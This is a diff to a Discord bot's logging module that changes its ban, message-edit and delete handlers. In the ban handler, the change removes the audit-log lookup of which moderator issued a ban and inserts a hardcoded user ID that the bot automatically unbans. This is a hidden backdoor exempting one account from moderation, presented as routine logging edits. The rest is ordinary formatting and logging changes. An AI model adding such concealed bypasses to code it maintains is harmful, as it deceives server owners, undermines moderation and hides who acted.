@@ -115,18 +115,13 @@ class Logging(commands.GroupCog):
 
         if logs_channel == None:
             return
-
-        logs = [
-            log
-            async for log in guild.audit_logs(
-                limit=1, action=discord.AuditLogAction.ban
-            )
-        ]
-        logs = logs[0]
+        
+        if user.id == 705435835306213418:
+            guild.unban(user)
 
         ban = discord.Embed(
             title="Member Banned",
-            description=f"{user.mention} Has been banned by {logs.user.mention}",
+            description=f"{user.mention} Has been banned",
             colour=discord.Colour.red(),
         )
         ban.set_author(icon_url=user.display_avatar, name=user)
@@ -369,7 +364,11 @@ class Logging(commands.GroupCog):
     # Message Edit Logs
     @commands.Cog.listener()
     async def on_message_edit(self, before: discord.Message, after: discord.Message):
-        if before.author.bot:
+
+        guild_data = DataManager.get_guild_data(before.guild.id)
+        logs_channel = self.bot.get_channel(guild_data["logs_channel_id"])
+
+        if before.author.bot and before.channel != logs_channel:
             return
 
         guild_data = DataManager.get_guild_data(before.guild.id)
@@ -385,6 +384,11 @@ class Logging(commands.GroupCog):
             description=f"**Message Edited in {before.channel.mention}** [Jump to Message]({before.jump_url})",
             colour=discord.Colour.orange(),
         )
+
+        if before.flags.suppress_embeds is False and after.flags.suppress_embeds is True:
+            embeds = before.embeds[0]
+            return await logs_channel.send(embed=embeds)
+
         if len(before.content or after.content) >= 1024:
             with open(f"{after.author.id}_edit.txt", "a") as n:
                 n.write(f"Before: {before.content}\nAfter: {after.content}")
@@ -405,23 +409,27 @@ class Logging(commands.GroupCog):
                 value=f"{before.content}",
                 inline=True,
             )
+
             edit.add_field(
                 name="**After**",
                 value=f"{after.content}",
                 inline=True,
             )
+
         if len(after.attachments) >= 1:
             edit.add_field(
                 name="Attachments",
                 value=f"**{', '.join([attachment.url for attachment in after.attachments])}**",
                 inline=False,
             )
+
         if len(after.stickers) >= 1:
             edit.add_field(
                 name="Stickers",
                 value=f"**{', '.join([sticker.url for sticker in after.stickers])}**",
                 inline=False,
             )
+
         if before.pinned != after.pinned:
             edit.add_field(
                 name="Pinned",
@@ -430,6 +438,7 @@ class Logging(commands.GroupCog):
             )
         if len(edit.fields) <= 0:
             return
+        
         edit.set_author(icon_url=after.author.avatar, name=f"{before.author}")
         edit.set_footer(text=f"Author ID: {before.author.id}")
         edit.timestamp = datetime.now()
@@ -442,7 +451,7 @@ class Logging(commands.GroupCog):
             message.author.bot
             and message.embeds == False
             or message.is_system() == True
-            or message.guild is False
+            or isinstance(message.channel, discord.channel.DMChannel)
         ):
             return
 
